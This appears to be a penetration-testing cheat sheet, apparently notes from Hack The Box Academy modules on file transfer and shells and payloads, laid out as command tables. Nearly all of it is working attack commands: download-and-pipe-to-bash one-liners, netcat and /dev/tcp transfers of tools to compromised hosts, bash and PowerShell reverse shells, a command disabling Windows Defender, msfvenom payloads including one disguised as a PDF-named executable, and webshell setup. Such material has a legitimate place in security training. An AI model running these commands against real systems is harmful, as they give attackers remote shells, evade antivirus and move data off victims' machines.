| `php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'` | PHP Download with Fopen() |
| `php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' \| bash` | PHP Download a File and Pipe it to Bash |
| | |
| **Other Languages** | |
| `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'` | Ruby - Download a File |
| `perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'` | Perl - Download a File |
| `cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1` | Download a File Using JavaScript and cscript.exe -CMD |

#### CSCRIPT.exe [JS]
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
#### OR [VBSCRIPT]

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Miscellaneous File Transfer Methods


| **Command** | **Description** |
| --------------|-------------------|
| **File Transfer with Netcat and Ncat** | |
| `nc -l -p 8000 > SharpKatz.exe` |  NetCat - Compromised Machine - Listening on Port 8000 |
| `ncat -l -p 8000 --recv-only > SharpKatz.exe` | Ncat - Compromised Machine - Listening on Port 8000 |
| `nc -q 0 192.168.49.128 8000 < SharpKatz.exe` | Netcat - Attack Host - Sending File to Compromised machine |
| `ncat --send-only 192.168.49.128 8000 < SharpKatz.exe` | Ncat - Attack Host - Sending File to Compromised machine |
| `sudo nc -l -p 443 -q 0 < SharpKatz.exe` | Attack Host - Sending File as Input to Netcat |
| `nc 192.168.49.128 443 > SharpKatz.exe` | Compromised Machine Connect to Netcat to Receive the File |
| `sudo ncat -l -p 443 --send-only < SharpKatz.exe` | Attack Host - Sending File as Input to Ncat |
| `ncat 192.168.49.128 443 --recv-only > SharpKatz.exe` | Compromised Machine Connect to Ncat to Receive the File |
| `cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe` | If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/, Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File |
| | |
| [PowerShell Session File Transfer](https://academy.hackthebox.com/module/24/section/161) | |
| | |
| **RDP** | |
| `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer` | Mounting a Linux Folder Using xfreerdp- To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session. |

### File Encryption on Windows 

| **Command** | **Description** |
| --------------|------------------- |
| **File Encryption on Windows** | |
| `Import-Module .\Invoke-AESEncryption.ps1` | Import Module Invoke-AESEncryption.ps1 -PWSH |
| `Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt` | File Encryption Example -PWSH |
| | |
| **File Encryption on Linux** | |
| `openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc` | Encrypting /etc/passwd with openssl |
| `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd` | Decrypt passwd.enc with openssl |

### [Catching Files over HTTP/S](https://academy.hackthebox.com/module/24/section/681)

### [Living off The Land]

##### [LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins](https://gtfobins.github.io/) for Linux are websites where we can search for binaries we can use for different functions.

| **Command** | **Description** |
| --------------|------------------- |
| `certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini` | Upload win.ini to our Pwnbox -CMD |
| `sudo nc -lvnp 80` | File Received in our Netcat Session |
| | |
| **OPENSSL** |  |
| `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem` | Create Certificate in our Pwnbox |
| `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh` | Stand up the Server in our Pwnbox |
| `openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh` | Download File from the Compromised Machine |
| | |
| **Other Common Living off the Land tools Powershell** | |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | File Download with Bitsadmin |
| `Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"` | PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers. DOWNLOAD |
| `Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql` | UPLOAD |
| | |
| **Certutil** |  Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage. |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a File with Certutil -CMD |

---

# Shells & Payloads

### Anatomy of a Shell

|**Commands** |**Description**|
|---|---|
| `ps` | Shell Validation From 'ps' |
| `env` | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use |

### Bind Shells

|**Commands** |**Description**|
|---|---|
| `nc -lvnp 7777` | Server - Target starting Netcat listener |
| `nc -nv 10.129.41.200 7777` | Client - Attack box connecting to target |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Server - Binding a Bash shell to the TCP session |
| `nc -nv 10.129.41.200 7777` | Client - Connecting to bind shell on target |

### Reverse Shells

|**Commands** |**Description**|
|---|---|
| `sudo nc -lvnp 443` | Server (attack box) |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | Client (target) -CMD |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Disabling anti virus/ Disabling AV -PWSH |

### Introduction to Payloads

|**Commands** |**Description**|
|---|---|
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc 10.10.14.12 7777 > /tmp/f` | Netcat/Bash Reverse Shell One-liner |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | Powershell One-liner |

### Crafting Payloads with MSFvenom

|**Commands** |**Description**|
|---|---|
| `msfvenom -l payloads` | List Payloads |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf` | Let's build a simple linux stageless payload with msfvenom |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe` | We can also use msfvenom to craft an executable (.exe) file that can be run on a Windows system to provide a shell. |
| `sudo nc -lvnp 443` | Listener |
| | |
| **Metasploit** | |
| `use exploit/windows/smb/psexec` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec` |
| `shell` | Command used in a meterpreter shell session to drop into a `system shell` |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload` |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe` | MSFvenom command used to generate a Windows-based reverse shell stageless payload |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho` | MSFvenom command used to generate a MacOS-based reverse shell payload |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | MSFvenom command used to generate a ASP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp` | MSFvenom command used to generate a JSP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war` | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload |

### Spawning Interactive Shells

|**Commands** |**Description**|
|---|---|
| `/bin/sh -i` | This command will execute the shell interpreter specified in the path in interactive mode (-i). | 
| `perl —e 'exec "/bin/sh";'` | If the programming language Perl is present on the system, these commands will execute the shell interpreter specified. |
| `perl: exec "/bin/sh";` | Perl |
| `ruby: exec "/bin/sh"` | If the programming language Ruby is present on the system, this command will execute the shell interpreter specified: |
| `Lua: os.execute('/bin/sh')` | If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command |
| `awk 'BEGIN {system("/bin/sh")}'` | This is shown in the short awk script, It can also be used to spawn an interactive shell. | 
| `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | find can also be used to execute applications and invoke a shell interpreter. |
| `find . -exec /bin/sh \; -quit` | This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained. |
| `vim -c ':!/bin/sh'` | We can set the shell interpreter language from within the popular command-line-based text-editor VIM. |
| `ls -la <path/to/fileorbinary>` | We can also attempt to run this command to check what sudo permissions the account we landed on has |
| `sudo -l` | The sudo -l command above will need a stable interactive shell to run. If you are not in a full shell or sitting in an unstable shell, you may not get any return from it. |

### Laudanum, One Webshell To Rule Them All 

|**Commands** |**Description**|
|---|---|
| `cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx` | Move a Copy for Modification Laudanum Webshell |

### Antak Webshell

|**Commands** |**Description**|
|---|---|
| `cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx` | Move a Copy for Modification ANTAK WEBSHELL |

---
